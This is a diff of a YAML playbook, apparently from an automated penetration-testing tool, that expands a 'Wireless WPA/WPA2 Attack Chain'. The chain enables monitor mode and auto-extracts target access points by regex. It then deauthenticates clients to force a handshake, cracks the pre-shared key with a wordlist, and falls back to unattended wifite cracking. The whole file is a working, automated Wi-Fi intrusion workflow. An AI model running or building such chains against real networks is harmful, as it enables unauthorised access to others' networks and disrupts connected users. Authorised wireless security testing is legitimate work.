@@ -1,54 +1,109 @@
 name: "Wireless WPA/WPA2 Attack Chain"
-description: "Full wireless assessment: capture handshake, deauth clients, crack WPA key."
+description: "Adaptive wireless WPA/WPA2 assessment: put the adapter in monitor mode, discover and target an AP, capture + deauth a handshake, and crack the PSK. Final step is the WiFi Auto-Crack Engine — fully-automated wifite that runs discovery, deauth, capture, and cracking unattended as a one-shot fallback."
 category: wireless
-attack_vector: "WPA/WPA2 handshake capture + offline cracking"
+attack_vector: "WLAN discovery → deauth → handshake capture → PSK cracking → WiFi Auto-Crack Engine (one-shot wifite fallback)"
 variables:
   interface:
     required: true
-    description: "Monitor-mode interface (e.g. wlan0mon)"
+    description: "Physical wireless interface (e.g. wlan0) — monitor mode will be enabled on it"
+  bssid:
+    required: false
+    description: "Target AP BSSID (auto-extracted from scan if omitted)"
+  essid:
+    required: false
+    description: "Target AP ESSID/SSID name (auto-extracted if omitted)"
   channel:
     required: false
-    description: "Channel to target"
+    default: "0"
+    description: "Target channel (0 = hop all channels; auto-updated from scan)"
   wordlist:
     required: false
     default: "/usr/share/wordlists/rockyou.txt"
     description: "Wordlist for cracking"
+  capture_file:
+    required: false
+    default: "handshake"
+    description: "-w capture prefix — airodump writes <prefix>-01.cap (deterimistic crack input)"
 cutting_edge: false
-references: ["aircrack-ng suite", "MITRE ATT&CK T1112"]
+references: ["aircrack-ng suite", "wifite", "MITRE ATT&CK T1112"]
 
 steps:
-  - name: "airodump_capture"
-    tool: "airodump_capture"
-    description: "Capture 802.11 frames to find target APs"
+  - name: enable_monitor
+    tool: monitor_mode_enable
+    description: "Put the wireless interface into monitor mode"
+    args:
+      interface: "{{interface}}"
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 2
+
+  - name: ap_discovery
+    tool: airodump_capture
+    description: "Discover APs and auto-extract the target BSSID/ESSID/channel"
     args:
       interface: "{{interface}}"
       channel: "{{channel}}"
-    expected_output: "BSSID|ESSID"
+      capture_file: "{{capture_file}}"
+    expected_output: "BSSID|ESSID|WPA"
     timeout: 120
     gate: true
-    retries: 2
+    retries: 1
+    extracts:
+      - var: "bssid"
+        regex: "([0-9A-Fa-f:]{17})"
+      - var: "essid"
+        regex: "[\\t ](?!\\*)[^\\t ]{1,32}$"
+      - var: "channel"
+        regex: "[\\t ]([0-9]{1,2})[\\t ]+[0-9]{1,4}[\\t ]+[A-Z0-9]"
 
-  - name: "aireplay_deauth"
-    tool: "aireplay_attack"
-    description: "Deauthenticate clients to force a WPA handshake"
+  - name: deauth_handshake
+    tool: aireplay_attack
+    description: "Deauthenticate clients on the target BSSID to force a WPA handshake"
     args:
       interface: "{{interface}}"
+      bssid: "{{bssid}}"
       attack: "0"
     expected_output: null
     timeout: 120
     gate: false
     retries: 2
 
-  - name: "aircrack_crack"
-    tool: "aircrack_crack"
-    description: "Crack the captured WPA handshake"
+  - name: handshake_capture
+    tool: airodump_capture
+    description: "Capture the WPA handshake on the target channel to a .cap file"
     args:
-      cap_file: "output/airodump_capture.stdout.txt"
+      interface: "{{interface}}"
+      bssid: "{{bssid}}"
+      channel: "{{channel}}"
+      capture_file: "{{capture_file}}"
+    expected_output: "WPA handshake|handshake"
+    timeout: 300
+    gate: false
+    retries: 2
+
+  - name: psk_crack
+    tool: aircrack_crack
+    description: "Crack the WPA/WPA2 PSK from the deterministic captured handshake file"
+    args:
+      cap_file: "{{capture_file}}-01.cap"
       wordlist: "{{wordlist}}"
-    expected_output: "KEY FOUND|Handshake|Network Manager"
+    expected_output: "KEY FOUND|WPA"
     timeout: 3600
     gate: false
-    retries: 1
+    retries: 0
     extracts:
-      - var: "wpa_key"
-        regex: "KEY FOUND! \\[\\s*([^\\]]+)\\s*\\]"
+      - var: "psk"
+        regex: "KEY FOUND!\\s*\\[\\s*([^\\]]+)\\s*\\]"
+
+  - name: wifi_auto_crack_engine
+    tool: wifite_auto
+    description: "WiFi Auto-Crack Engine — one-shot adaptive cracking: wifite autonomously discovers targets, performs deauth, captures the handshake, and cracks unattended. Zero manual tuning; last-resort catch-all when the manual capture and crack above never yielded a PSK."
+    args:
+      interface: "{{interface}}"
+      wordlist: "{{wordlist}}"
+    expected_output: "WPA|handshake|key"
+    timeout: 3600
+    gate: false
+    retries: 0
+    on_fail: "warn"
